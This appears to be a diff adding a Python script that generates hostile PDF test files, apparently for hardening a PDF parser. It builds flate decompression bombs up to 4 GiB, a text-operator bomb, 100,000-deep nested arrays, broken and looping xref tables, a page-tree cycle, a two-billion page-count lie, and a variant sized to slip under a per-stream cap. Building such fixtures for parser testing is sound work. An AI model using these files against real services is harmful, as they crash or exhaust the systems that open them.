@@ -1,0 +1,115 @@
+"""Build small hostile PDFs into attacks/. Raw bytes, correct xref unless the attack is the xref."""
+import os
+import zlib
+
+OUT = os.path.join(os.path.dirname(__file__), "attacks")
+os.makedirs(OUT, exist_ok=True)
+
+FONT = b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"
+
+
+def build(objs, trailer_extra=b"", broken_xref=False, xref_prev_self=False):
+    """objs: list of bytes bodies for objects 1..n (object 1 = Catalog)."""
+    out = bytearray(b"%PDF-1.7\n%\xe2\xe3\xcf\xd3\n")
+    offs = []
+    for i, body in enumerate(objs, 1):
+        offs.append(len(out))
+        out += b"%d 0 obj\n" % i + body + b"\nendobj\n"
+    xref_at = len(out)
+    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs) + 1)
+    for o in offs:
+        if broken_xref:
+            o = (o * 7919 + 13) % (len(out) + 5000)  # garbage offsets
+        out += b"%010d 00000 n \n" % o
+    prev = b" /Prev %d" % xref_at if xref_prev_self else b""
+    out += b"trailer\n<< /Size %d /Root 1 0 R%s%s >>\n" % (len(objs) + 1, prev, trailer_extra)
+    sx = xref_at if not broken_xref else xref_at + 3  # startxref also off by 3
+    out += b"startxref\n%d\n%%%%EOF\n" % sx
+    return bytes(out)
+
+
+def stream(data, filters=b"/FlateDecode", extra=b""):
+    return b"<< /Length %d /Filter %s%s >>\nstream\n" % (len(data), filters, extra) + data + b"\nendstream"
+
+
+def one_page(content_obj_body, page_extra=b""):
+    return [
+        b"<< /Type /Catalog /Pages 2 0 R >>",
+        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
+        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R "
+        b"/Resources << /Font << /F1 5 0 R >> >>" + page_extra + b" >>",
+        content_obj_body,
+        FONT,
+    ]
+
+
+def write(name, data):
+    p = os.path.join(OUT, name)
+    open(p, "wb").write(data)
+    print(f"{name:28} {len(data):>10} bytes")
+
+
+def deflate_stream_of(chunk, total, level=9):
+    """Compress `total` bytes made of repeated `chunk` without holding them all in RAM."""
+    c = zlib.compressobj(level)
+    parts = []
+    block = chunk * (8 * 2**20 // len(chunk))
+    left = total
+    while left > 0:
+        b = block[: min(left, len(block))]
+        parts.append(c.compress(b))
+        left -= len(b)
+    parts.append(c.flush())
+    return b"".join(parts)
+
+
+GiB = 2**30
+# A1 single-layer flate bomb: 1 GiB of spaces inside a page content stream (~1 MB file)
+z1 = deflate_stream_of(b" ", GiB)
+write("a1_flate_1GiB_1layer.pdf", build(one_page(stream(z1))))
+# A1b same idea but fits under 262,144 bytes: 256 MiB of spaces
+z1b = deflate_stream_of(b" ", 256 * 2**20)
+write("a1b_flate_256MiB_small.pdf", build(one_page(stream(z1b))))
+# A2 double-layer flate bomb: 4 GiB of spaces, compressed twice (tiny file)
+z2 = zlib.compress(deflate_stream_of(b" ", 4 * GiB), 9)
+write("a2_flate_4GiB_2layer.pdf", build(one_page(stream(z2, b"[/FlateDecode /FlateDecode]"))))
+# A3 text-operator bomb: 64 MiB of real text-show operators (CPU, not just memory)
+ops = b"BT /F1 12 Tf 72 700 Td " + b"(Aa) Tj " * 1 + b""
+z3 = deflate_stream_of(b"BT /F1 12 Tf 72 700 Td (Hello world) Tj ET\n", 64 * 2**20)
+write("a3_textops_64MiB.pdf", build(one_page(stream(z3))))
+# A4 deep nesting: 100,000 nested arrays in an object the page references
+depth = 100_000
+nested = b"[" * depth + b"1" + b"]" * depth
+objs = one_page(stream(zlib.compress(b"BT /F1 12 Tf 72 700 Td (nested) Tj ET")), b" /Foo 6 0 R")
+objs.append(nested)
+write("a4_nested_arrays_100k.pdf", build(objs))
+# A4b deep nesting inside the content stream (operand arrays)
+write("a4b_nested_in_content.pdf", build(one_page(stream(zlib.compress(
+    b"BT /F1 12 Tf 72 700 Td " + b"[" * depth + b"(x)" + b"]" * depth + b" TJ ET")))))
+# A5 broken xref: every offset garbage and startxref off by 3 (forces repair)
+write("a5_broken_xref.pdf", build(one_page(stream(zlib.compress(
+    b"BT /F1 12 Tf 72 700 Td (repair me) Tj ET"))), broken_xref=True))
+# A5b xref chain loop: trailer /Prev points at its own xref section
+write("a5b_xref_prev_loop.pdf", build(one_page(stream(zlib.compress(
+    b"BT /F1 12 Tf 72 700 Td (prev loop) Tj ET"))), xref_prev_self=True))
+# A6 page-tree cycle: Pages node lists itself as a kid
+cyc = one_page(stream(zlib.compress(b"BT /F1 12 Tf 72 700 Td (cycle) Tj ET")))
+cyc[1] = b"<< /Type /Pages /Kids [3 0 R 2 0 R] /Count 2 >>"
+write("a6_page_tree_cycle.pdf", build(cyc))
+# A6b /Count lie: claims 2,000,000,000 pages
+lie = one_page(stream(zlib.compress(b"BT /F1 12 Tf 72 700 Td (count lie) Tj ET")))
+lie[1] = b"<< /Type /Pages /Kids [3 0 R] /Count 2000000000 >>"
+write("a6b_count_lie.pdf", build(lie))
+# Control: benign one-page file built by the same builder
+write("a0_control.pdf", build(one_page(stream(zlib.compress(
+    b"BT /F1 12 Tf 72 700 Td (control text) Tj ET")))))
+
+if __name__ == "__main__" and os.environ.get("A3C"):
+    # A3c: 10 pages sharing ONE 3.9 MB text-op stream: stays under a 4 MB per-stream cap
+    z = deflate_stream_of(b"BT /F1 12 Tf 72 700 Td (Hello world) Tj ET\n", 88636 * 44)
+    kids = b" ".join(b"%d 0 R" % (3 + i) for i in range(10))
+    objs = [b"<< /Type /Catalog /Pages 2 0 R >>", b"<< /Type /Pages /Kids [" + kids + b"] /Count 10 >>"]
+    for i in range(10):
+        objs.append(b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 13 0 R /Resources << /Font << /F1 14 0 R >> >> >>")
+    objs += [stream(z), FONT]
+    write("a3c_textops_3.9MB_x10pages.pdf", build(objs))
